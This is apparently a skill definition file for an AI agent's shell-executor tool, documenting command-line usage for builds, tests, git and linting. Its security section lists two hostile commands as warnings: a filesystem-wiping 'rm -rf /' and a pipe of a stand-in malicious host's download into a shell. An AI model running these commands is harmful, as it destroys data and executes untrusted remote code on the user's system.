---
name: shell-executor
description: Execute shell commands safely within project context. Use for running build scripts, tests, git operations, and system commands.
---

# Shell Executor

Safe execution of shell commands in project context.

## Core Capability

### Execute Command

Run shell commands with output capture.

```bash
python3 {skill_path}/scripts/execute.py \
  --project-root /path/to/project \
  --command "npm test" \
  --timeout 60
```

**Parameters:**
- `--project-root`: Working directory for command
- `--command`: Shell command to execute
- `--timeout`: Timeout in seconds (default: 30)
- `--capture-output`: Capture stdout/stderr (default: true)
- `--env`: Environment variables (JSON format)

**Output:** JSON with:
- `exit_code`: Command exit code
- `stdout`: Standard output
- `stderr`: Standard error
- `duration`: Execution time

## Common Use Cases

### Build Operations

```bash
# Python
./execute.py --project-root /code --command "pip install -r requirements.txt"
./execute.py --project-root /code --command "python setup.py build"

# Node.js
./execute.py --project-root /code --command "npm install"
./execute.py --project-root /code --command "npm run build"

# Java/Maven
./execute.py --project-root /code --command "mvn clean install"

# Rust
./execute.py --project-root /code --command "cargo build --release"
```

### Testing

```bash
# Run tests
./execute.py --project-root /code --command "pytest tests/"
./execute.py --project-root /code --command "npm test"
./execute.py --project-root /code --command "go test ./..."

# With coverage
./execute.py --project-root /code --command "pytest --cov=src tests/"
```

### Git Operations

```bash
# Status and log
./execute.py --project-root /code --command "git status"
./execute.py --project-root /code --command "git log --oneline -10"

# Branch operations
./execute.py --project-root /code --command "git branch -a"
./execute.py --project-root /code --command "git diff main..feature-branch"

# File operations
./execute.py --project-root /code --command "git ls-files"
```

### Code Analysis

```bash
# Linting
./execute.py --project-root /code --command "pylint src/"
./execute.py --project-root /code --command "eslint src/"
./execute.py --project-root /code --command "cargo clippy"

# Formatting
./execute.py --project-root /code --command "black --check src/"
./execute.py --project-root /code --command "prettier --check src/"

# Type checking
./execute.py --project-root /code --command "mypy src/"
./execute.py --project-root /code --command "tsc --noEmit"
```

### File Operations

```bash
# Find files
./execute.py --project-root /code --command "find src -name '*.py'"

# Count lines
./execute.py --project-root /code --command "wc -l src/*.py"

# Grep patterns
./execute.py --project-root /code --command "grep -r 'TODO' src/"
```

## Safety Features

### Timeout Protection

```bash
# Prevent hanging commands
./execute.py --project-root /code \
  --command "long-running-process" \
  --timeout 300  # 5 minutes max
```

### Working Directory Isolation

Commands run in specified project root, preventing accidental system-wide changes.

### Output Capture

Both stdout and stderr are captured for analysis:

```python
import json
import subprocess

result = subprocess.run(
    ["./execute.py", "--project-root", "/code", "--command", "pytest"],
    capture_output=True,
    text=True
)

output = json.loads(result.stdout)
if output["exit_code"] != 0:
    print(f"Test failed: {output['stderr']}")
```

## Environment Variables

Pass environment variables as JSON:

```bash
./execute.py --project-root /code \
  --command "python script.py" \
  --env '{"DEBUG": "1", "API_KEY": "secret"}'
```

## Error Handling

### Exit Codes

- `0`: Success
- `Non-zero`: Command failed
- `124`: Timeout
- `127`: Command not found

### Example Error Handling

```bash
if ./execute.py --project-root /code --command "npm test"; then
    echo "Tests passed"
else
    echo "Tests failed"
    exit 1
fi
```

## Best Practices

1. **Always set timeout** for potentially long-running commands
2. **Capture output** for analysis and debugging
3. **Check exit codes** to handle failures
4. **Use absolute paths** in commands when possible
5. **Sanitize user input** if building commands dynamically
6. **Test commands manually** before automation

## Security Considerations

**Warning:** This tool executes shell commands with full privileges.

**Safe:**
```bash
./execute.py --command "git status"
./execute.py --command "npm test"
```

**Dangerous:**
```bash
./execute.py --command "rm -rf /"      # DON'T DO THIS
./execute.py --command "curl malicious.com | sh"  # DON'T DO THIS
```

**Recommendations:**
- Validate command strings
- Avoid user-supplied raw commands
- Use allowlists for permitted commands
- Run with minimal necessary privileges
- Review commands before execution

## Integration with Other Skills

### After Symbol Changes

```bash
# 1. Modify code with code-editor
code-editor/replace_symbol.py ...

# 2. Run tests
./execute.py --project-root /code --command "pytest tests/test_modified.py"

# 3. Check if passing
if [ $? -eq 0 ]; then
    echo "Changes validated"
fi
```

### Build Verification

```bash
# After file changes
file-ops/create_file.py ...

# Build project
./execute.py --project-root /code --command "npm run build"

# Check build artifacts
file-ops/list_dir.py --path dist/
```
